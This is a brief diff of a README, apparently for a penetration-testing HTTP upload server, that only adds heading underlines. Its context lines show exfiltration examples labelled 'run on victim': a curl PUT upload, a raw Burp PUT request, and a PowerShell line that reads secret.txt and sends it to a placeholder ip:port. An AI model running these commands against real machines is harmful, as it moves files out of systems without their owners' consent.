@@ -7,10 +7,11 @@ Example usages (run on victim)
 ------------------------
 ```
 curl
----
+----
 curl -X PUT --upload-file test.txt http://<ip-address>:<port>
 
 Burp
+----
 PUT /hello.txt HTTP/1.1
 Host: <ip-address>
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
@@ -24,9 +25,12 @@ Upgrade-Insecure-Requests: 1
 sdokajsldfkhfsdfdf
 
 powershell
+----------
 $body = Get-Content secret.txt
 Invoke-RestMethod -Uri http://ip:port/secret.txt -Method PUT -Body $body
 ```
+
+
 Script
 ------------------------
 ```python
